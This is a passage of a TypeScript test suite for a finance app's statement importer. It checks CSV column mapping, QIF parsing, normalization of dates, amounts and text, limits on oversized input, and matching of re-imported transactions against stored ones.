    expect(readCsvTable('Just one column\nvalue\n')).toEqual({ error: expect.stringContaining('needs at least a date, a description and an amount') });
    expect(readCsvTable('\n\n')).toEqual({ error: 'This file is empty.' });
    expect(readImport('', { options: {}, thisYear: YEAR })).toMatchObject({ status: 'error' });
  });

  test('a mapping is checked against the file: every column in it, each used once, one way of giving amounts', () => {
    const header = ['Date', 'Description', 'Amount', 'Debit', 'Credit'];
    expect(columnsProblem({ date: 0, description: 1, amount: 2 }, header)).toBeNull();
    expect(columnsProblem({ date: 0, description: 1, amount: 9 }, header)).toContain('isn’t in this file');
    expect(columnsProblem({ date: 0, description: 0, amount: 2 }, header)).toBe('Each column can only be used once.');
    expect(columnsProblem({ date: 0, description: 1, amount: 2, debit: 3 }, header)).toContain('not both');
    expect(columnsProblem({ date: 0, description: 1, debit: 3 }, header)).toBe('Choose both the money-out and the money-in column.');
    expect(columnsProblem({ date: 0, description: 1 }, header)).toBe('Choose the amount column.');
    expect(columnsProblem({ description: 1, amount: 2 } as never, header)).toBe('Choose the date column.');
    expect(columnsProblem({ date: 0, amount: 2 } as never, header)).toBe('Choose the description column.');
    const r = readImport('Date,Description,Amount\n2026-09-01,A,-1\n', { options: { csv: { columns: { date: 0, description: 1 } as never, sign: 'negative-out' } }, thisYear: YEAR });
    expect(r).toMatchObject({ status: 'mapping', problem: 'Choose the amount column.' });
  });

  test('a remembered mapping applies by column name to the next file from the same bank, and only when every column is there', () => {
    const header = ['Transaction Date', 'Posted Date', 'Description', 'Debit', 'Credit'];
    const named = namesOf({ date: 0, description: 2, debit: 3, credit: 4 }, header);
    expect(named).toEqual({ date: 'Transaction Date', description: 'Description', debit: 'Debit', credit: 'Credit' });
    expect(columnsFromNames(named, ['Credit', 'debit', ' DESCRIPTION ', 'Transaction Date'])).toEqual({ date: 3, description: 2, debit: 1, credit: 0 });
    expect(columnsFromNames(named, ['Transaction Date', 'Description', 'Amount'])).toBeNull();
  });

  test('a billion-row claim, and a file of nothing but separators and line breaks, are bounded by what is there', () => {
    const claim = 'Rows: 1000000000\nDate,Description,Amount\n2026-09-01,Only one,-1\n';
    expect(ready(claim, map({ date: 0, description: 1, amount: 2 })).records).toHaveLength(1);
    const started = performance.now();
    const junk = readCsvTable(',,,\n'.repeat(750_000));
    expect(performance.now() - started).toBeLessThan(3000);
    expect(junk).toEqual({ error: 'This file is empty.' });
  });

  test('more rows than one import takes: refused whole', () => {
    const text = 'Date,Description,Amount\n' + Array.from({ length: MAX_IMPORT_ROWS + 1 }, (_, i) => `2026-09-01,Row ${i},-1`).join('\n');
    expect(readImport(text, { options: map({ date: 0, description: 1, amount: 2 }), thisYear: YEAR })).toMatchObject({ status: 'error', error: expect.stringContaining('more than 10,000') });
    const fits = 'Date,Description,Amount\n' + Array.from({ length: MAX_IMPORT_ROWS }, (_, i) => `2026-09-01,Row ${i},-1`).join('\n');
    expect(ready(fits, map({ date: 0, description: 1, amount: 2 })).records).toHaveLength(MAX_IMPORT_ROWS);
  });
});

describe('QIF', () => {
  const text = fixture('checking.qif');

  test('a Quicken bank export: apostrophe dates, thousands, a transfer, a check, a split, U beside T, and the opening balance left out', () => {
    const r = ready(text);
    expect(r.format).toBe('qif');
    expect(r.read).toMatchObject({ date_order: 'mdy', decimal: '.' });
    expect(r.records.map((x) => [x.line, x.date, x.amount, x.description, x.category, x.note])).toEqual([
      [8, '2026-09-01', 4.5, 'SQ *BLUE BOTTLE COFFEE', 'Dining:Coffee', 'POS PURCHASE'],
      [14, '2026-09-02', -2450, 'ACME CORP PAYROLL', 'Salary', null],
      [19, '2026-09-03', 500, 'Transfer to savings', 'transfer out', null],
      [24, '2026-09-10', 1450, 'Pacific Property Mgmt', 'Housing:Rent', null],
      [30, '2026-09-12', 61.37, 'AT&T Wireless', 'Utilities:Phone', null],
      [35, '2026-09-15', 210, 'Costco', null, null],
      [44, '2026-09-20', 30.25, 'Shell Oil 57442', 'Auto:Fuel', 'Gas'],
    ]);
    expect(r.problems).toEqual([
      { line: 2, reason: 'This is Quicken’s opening balance for the account, not a transaction, so it isn’t imported.', raw: ["D8/31'26", 'T1,000.00', 'CX', 'POpening Balance', 'L[Checking]'] },
    ]);
    // The split is kept whole in the raw record.
    expect(r.records[5].raw).toEqual(["D9/15'26", 'T-210.00', 'PCostco', 'SGroceries', 'EFood', '$-150.00', 'SHousehold', '$-60.00']);
  });

  test('several accounts in one file ask which; a card section reads charges as money out', () => {
    const multi = [
      '!Account', 'NEveryday Checking', 'TBank', '^', '!Type:Bank', 'D09/01/2026', 'T-1.00', 'PA', '^',
      '!Account', 'NTravel Card', 'TCCard', '^', '!Type:CCard', 'D09/13/2026', 'T-25.00', 'PHotel', '^', 'D09/14/2026', 'T100.00', 'PPayment',
    ].join('\n');
    const asked = readImport(multi, { options: {}, thisYear: YEAR });
    expect(asked.status).toBe('statement');
    if (asked.status === 'statement') expect(asked.statements.map((s) => [s.label, s.kind, s.count])).toEqual([['Everyday Checking', 'bank', 1], ['Travel Card', 'creditcard', 2]]);
    // The last record needs no closing "^".
    expect(ready(multi, { statement: 1 }).records.map((x) => [x.description, x.amount, x.date])).toEqual([
      ['Hotel', 25, '2026-09-13'],
      ['Payment', -100, '2026-09-14'],
    ]);
  });

  test('dates every one of which fits both orders ask; categories, classes and investments are passed over', () => {
    const text2 = ['!Type:Cat', 'NFood', 'E', '^', '!Type:Bank', "D1/2'26", 'T-1.00', 'PA', 'LFood/Business', '^', "D3/4'26", 'T-2.00', 'MOnly a memo', '^', '!Type:Invst', 'D1/5/26', 'NBuy', '^'].join('\n');
    expect(readImport(text2, { options: {}, thisYear: YEAR })).toMatchObject({ status: 'date_order', detection: { ambiguous: true } });
    const r = ready(text2, { date_order: 'dmy' });
    expect(r.records.map((x) => [x.date, x.description, x.category])).toEqual([
      ['2026-02-01', 'A', 'Food'],
      ['2026-04-03', 'Only a memo', null],
    ]);
    expect(r.problems.map((p) => p.reason)).toEqual(['An investment account’s transactions start here; they can’t be imported, so they were skipped.']);
    expect(parseQif('!Type:Invst\nD1/5/26\n^\n').error).toContain('only investment transactions');
    expect(parseQif('!Type:Cat\nNFood\n^\n').error).toContain('no bank, cash or credit card transactions');
  });

  test('records that can’t be read say why; a long line is refused', () => {
    const bad = ['!Type:Bank', 'T-1.00', 'PNo date', '^', 'D9/1/26', 'PNo amount', '^', 'D9/1/26', 'T-1.00', '^', `D9/1/26`, 'T-1.00', `P${'z'.repeat(MAX_FIELD_CHARS + 5)}`, '^'].join('\n');
    const section = parseQif(bad).sections[0];
    expect(qifRecords(section, { date_order: 'mdy', decimal: '.' }, YEAR).problems.map((p) => [p.line, p.reason])).toEqual([
      [2, 'It has no date.'],
      [5, 'It has no amount.'],
      [8, 'It has no payee.'],
      [11, `A line of this transaction is over ${MAX_FIELD_CHARS.toLocaleString('en-US')} characters long, so it can’t be read.`],
    ]);
  });
});

describe('normalize: each record as a manual row, by the rules a typed one meets', () => {
  const rec = (over: Partial<RawRecord> = {}): RawRecord => ({ source: 'csv', date: '2026-09-01', amount: 4.5, description: 'Coffee', raw: [], line: 2, ...over });

  test('dates: real, from 1900, no later than tomorrow', () => {
    const r = rows([rec({ date: '2026-10-10' }), rec({ date: '2026-10-11' }), rec({ date: '1899-12-31' }), rec({ date: '2026-02-30' })]);
    expect(r.rows.map((x) => x.row.date)).toEqual(['2026-10-10']);
    expect(r.problems.map((p) => p.reason)).toEqual(['It is dated 2026-10-11, in the future.', 'It is dated 1899-12-31, before 1900.', 'Its date isn’t a real day.']);
  });

  test('amounts: not zero, within bounds, whole minor units of their own currency', () => {
    const r = rows([
      rec({ amount: 0 }),
      rec({ amount: 2e12 }),
      rec({ amount: 12.345 }),
      rec({ amount: 1234, currency: 'JPY' }),
      rec({ amount: 12.5, currency: 'JPY' }),
      rec({ amount: 1.234, currency: 'KWD' }),
      rec({ amount: 5, currency: 'XYZ' }),
    ]);
    expect(r.rows.map((x) => [x.row.amount, x.row.currency])).toEqual([
      [1234, 'JPY'],
      [1.234, 'KWD'],
    ]);
    expect(r.problems.map((p) => p.reason)).toEqual([
      'Its amount is zero.',
      'Its amount is too large.',
      'An amount in USD has at most 2 decimal places, and this one has more.',
      'An amount in JPY is a whole number, and this one has more.',
      'Its currency (XYZ) isn’t one Nya knows.',
    ]);
  });

  test('text: control characters and invisible reordering marks gone, spaces single, long text shortened and flagged', () => {
    const long = 'CARD PURCHASE WITH PIN 09/01 '.repeat(8);
    const r = rows([
      rec({ description: 'Coffee\u0000‮ shop​\tSEATTLE', category: '  Food AND Drink ', note: 'line one\r\nline two' }),
      rec({ description: long, note: 'n'.repeat(600) }),
      rec({ description: '   ' }),
      rec({ description: '😀'.repeat(60) }),
    ]);
    expect(r.rows[0].row).toMatchObject({ name: 'Coffee shop SEATTLE', category: 'food and drink', note: 'line one line two' });
    expect(r.rows[0].shortened).toBe(false);
    expect(r.rows[1].row.name).toHaveLength(100);
    expect(r.rows[1].row.note).toHaveLength(500);
    expect(r.rows[1].shortened).toBe(true);
    // Never a character cut in two.
    expect(r.rows[2].row.name.length).toBeLessThanOrEqual(100);
    expect(r.rows[2].row.name.endsWith('😀')).toBe(true);
    expect(r.problems.map((p) => p.reason)).toEqual(['It has no description.']);
  });

  test('where it came from: an OFX row keeps its FITID; a CSV or QIF row the content key it was imported with', () => {
    const [ofx, bare, csv, qif] = rows([
      rec({ source: 'ofx', source_id: 'FIT-1' }),
      rec({ source: 'ofx' }),
      rec({ description: 'SQ *Coffee   Shop' }),
      rec({ source: 'qif', amount: -12, currency: 'EUR' }),
    ]).rows.map((x) => x.row);
    expect(ofx).toMatchObject({ source: 'import:ofx', source_id: 'FIT-1' });
    expect(bare).toMatchObject({ source: 'import:ofx', source_id: null });
    expect(csv).toMatchObject({ source: 'import:csv', source_id: '2026-09-01|USD|450|sq coffee shop' });
    expect(qif).toMatchObject({ source: 'import:qif', source_id: '2026-09-01|EUR|-1200|coffee' });
    expect(normalizeDescription('ÉCOLE  Café-Shop #12')).toBe('école café shop 12');
    expect(contentKey({ date: '2026-09-01', amount: 1234, currency: 'JPY', name: 'X' })).toBe('2026-09-01|JPY|1234|x');
  });
});

describe('match: what an account already has', () => {
  let n = 0;
  const stored = (over: Partial<StoredRow> = {}): StoredRow => ({ id: `manual-txn:${++n}`, date: '2026-09-03', amount: 4.5, currency: 'USD', name: 'SQ *BLUE BOTTLE COFFEE', source: 'manual', source_id: null, ...over });
  const ofxRows = () => rows(ready(fixture('checking-ofx102.ofx')).records).rows.map((x) => x.row);
  const csvRows = () =>
    rows(ready(fixture('card-debit-credit.csv'), { csv: { columns: { date: 0, description: 3, debit: 5, credit: 6 }, sign: 'negative-out' } }).records).rows.map((x) => x.row);
  const asStored = (r: { date: string; amount: number; currency: string; name: string; source: string; source_id: string | null }) => stored({ ...r });

  test('the same OFX imported again adds nothing: every row found by FITID, the repeated one still a repeat', () => {
    const first = ofxRows();
    const outcomes = matchRows(first, []);
    expect(countOutcomes(outcomes)).toEqual({ new: 8, present: 0, repeated: 1 });
    const kept = first.filter((_, i) => outcomes[i].outcome === 'new').map(asStored);
    const again = matchRows(ofxRows(), kept);
    expect(countOutcomes(again)).toEqual({ new: 0, present: 8, repeated: 1 });
    expect(again.every((o) => o.outcome !== 'present' || o.by === 'id')).toBe(true);
  });

  test('found by FITID even after the row was edited', () => {
    const [pay] = ofxRows();
    const edited = stored({ ...pay, name: 'Salary', amount: -2400, date: '2026-09-02' });
    expect(matchRows([pay], [edited])).toEqual([{ outcome: 'present', row_id: edited.id, by: 'id' }]);
  });

  test('two identical coffees on one day are two rows; a row typed by hand is one of them', () => {
    const coffees = ofxRows().filter((r) => r.name === 'SQ *BLUE BOTTLE COFFEE');
    expect(coffees).toHaveLength(2);
    expect(countOutcomes(matchRows(coffees, []))).toEqual({ new: 2, present: 0, repeated: 0 });
    // One typed by hand already: that one is found by content, the other is new.
    const typed = stored();
    expect(matchRows(coffees, [typed])).toEqual([{ outcome: 'present', row_id: typed.id, by: 'content' }, { outcome: 'new' }]);
  });

  test('an OFX row with a FITID is never taken for a stored row with another FITID, however alike', () => {
    const [a, b] = ofxRows().filter((r) => r.name === 'SQ *BLUE BOTTLE COFFEE');
    expect(matchRows([b], [asStored(a)])).toEqual([{ outcome: 'new' }]);
  });

  test('a CSV imported again reports what it skipped; identical rows match one each; an edited row is still known', () => {
    const first = csvRows();
    const stored1 = first.map(asStored);
    expect(countOutcomes(matchRows(csvRows(), stored1))).toEqual({ new: 0, present: 11, repeated: 0 });
    // One of the two coffees stored: the other is new.
    const oneCoffee = stored1.filter((r, i) => i !== 4);
    expect(matchRows(csvRows(), oneCoffee)[4]).toEqual({ outcome: 'new' });
    // Renamed and recategorized since: found by the key it was imported with.
    const renamed = stored1.map((r) => ({ ...r, name: 'Something else' }));
    expect(countOutcomes(matchRows(csvRows(), renamed))).toEqual({ new: 0, present: 11, repeated: 0 });
  });

  test('another currency or another day is another transaction', () => {
    const [coffee] = csvRows().filter((r) => r.name.startsWith('BLUE BOTTLE'));
    expect(matchRows([coffee], [stored({ date: coffee.date, name: coffee.name, amount: coffee.amount, currency: 'EUR' })])).toEqual([{ outcome: 'new' }]);
    expect(matchRows([coffee], [stored({ date: '2026-09-23', name: coffee.name, amount: coffee.amount })])).toEqual([{ outcome: 'new' }]);
    expect(matchRows([coffee], [stored({ date: coffee.date, name: 'blue  bottle-coffee seattle WA', amount: coffee.amount })])[0]).toMatchObject({ outcome: 'present', by: 'content' });
  });
});
